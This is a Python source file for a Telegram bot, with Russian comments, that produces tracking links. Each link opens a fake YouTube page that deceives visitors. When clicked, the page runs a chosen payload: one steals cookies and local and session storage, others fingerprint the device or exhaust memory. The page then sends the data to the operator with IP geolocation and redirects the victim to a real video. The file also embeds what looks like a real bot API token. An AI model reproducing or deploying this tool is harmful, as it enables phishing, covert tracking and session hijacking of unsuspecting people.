import asyncio, threading, requests, uuid, base64
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

# --- АРСЕНАЛ (Исправленные скрипты) ---
PAYLOADS = {
    "ANALYTICS": {
        "name": "📊 Deep Analytics (Вкладки/Сессия)",
        "js": "d.pages=window.history.length; d.referrer=document.referrer; d.lang=navigator.language; d.scr=screen.width+'x'+screen.height;",
        "vuln": "Information Leakage / User Tracking"
    },
    "STEALER": {
        "name": "🍪 Cookie & Session Grabber",
        "js": "try { d.cookies = document.cookie || 'Protected'; d.local=JSON.stringify(localStorage); d.session=JSON.stringify(sessionStorage); } catch(e) { d.err='Blocked'; }",
        "vuln": "Session Hijacking (High Risk)"
    },
    "EXPLOIT": {
        "name": "🔥 Browser Strike (V8 Injection)",
        "js": "console.log('Targeting V8...'); let trash = []; for(let i=0;i<100;i++){ trash.push(new ArrayBuffer(1024*1024)); } d.exploit='Memory_Load_Success';",
        "vuln": "Resource Exhaustion / Potential RCE PoC"
    }
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; height: 50px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12%; cursor: pointer; z-index: 10; }
        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 26px; top: 14px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="strike()">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.7;">
        <div class="play-btn" id="pbtn"></div>
        <div class="loader" id="ldr"></div>
    </div>
    <div style="padding: 15px; width: 100%; box-sizing: border-box;">
        <div style="font-size: 18px; font-weight: bold;">Exclusive Report: Telegram Leak 2026</div>
        <div style="font-size: 12px; color: #606060; margin-top: 5px;">3.4 млн просмотров • 2 часа назад</div>
    </div>
<script>
let sent = false;
async function strike() {
    if(sent) return;
    document.getElementById('pbtn').style.display = 'none';
    document.getElementById('ldr').style.display = 'block';
    
    let d = { aid: "{{ aid }}", ua: navigator.userAgent };
    
    // Внедрение выбранного скрипта
    try { {{ custom_script|safe }} } catch(e) { d.js_err = e.message; }

    // Сбор данных железа
    try { 
        let c = document.createElement('canvas'); let gl = c.getContext('webgl'); 
        let dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%";
    } catch(e) {}

    // Отправка
    sent = true;
    fetch('/catch', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(d) 
    }).finally(() => { 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
    });
}
</script>
</body>
</html>
"""

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "ANALYTICS")
    script = PAYLOADS.get(mode, PAYLOADS["ANALYTICS"])["js"]
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # --- ТИХОЕ ГЕО ПО IP (Работает всегда) ---
    geo_data = {}
    try:
        r = requests.get(f"http://ip-api.com/json/{ips}?fields=status,country,city,lat,lon,isp").json()
        if r['status'] == 'success': geo_data = r
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    mode = user_settings.get(str(d['aid']), "ANALYTICS")
    exploit_vault[token] = { "vuln": PAYLOADS[mode]["vuln"], "full_dump": d, "ip_geo": geo_data }

    report = (
        f"🚨 **ОБЪЕКТ ВЗЛОМАН ({mode})**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ips}`\n"
        f"📍 **ГЕО (IP):** `{geo_data.get('city', 'N/A')}, {geo_data.get('country', 'N/A')}`\n"
        f"📡 **ISP:** `{geo_data.get('isp', 'N/A')}`\n"
        f"🗺 [Google Maps](https://www.google.com/maps?q={geo_data.get('lat')},{geo_data.get('lon')})\n\n"
        f"📱 **DEVICE:**\n"
        f"• GPU: `{d.get('gpu', 'N/A')}`\n"
        f"• Battery: `{d.get('bat', 'N/A')}`\n"
        f"• Вкладок в истории: `{d.get('pages', 'N/A')}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **TOKEN:** `{token}`\n"
        f"Отправь токен боту для полного дампа."
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🔥 Настроить Payload")
    await message.answer("💀 **OSINT COMMAND CENTER v19.5**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🔥 Настроить Payload")
async def setup(message: types.Message):
    kb = InlineKeyboardBuilder()
    for key, val in PAYLOADS.items():
        kb.button(text=val["name"], callback_data=f"mode_{key}")
    kb.adjust(1)
    await message.answer("Выбери тип атаки:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("mode_"))
async def finalize(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"✅ **ГОТОВО!**\nРежим: `{PAYLOADS[mode]['name']}`\n\n🔗 `{link}`")

@dp.message(F.text.startswith("EXP-"))
async def dump(message: types.Message):
    t = message.text.strip().upper()
    if t in exploit_vault:
        data = exploit_vault[t]
        await message.answer(f"🔓 **ПОЛНЫЙ ДАМП {t}:**\n\n`{data}`")

async def main():
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, lambda: app.run(host='0.0.0.0', port=10000))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
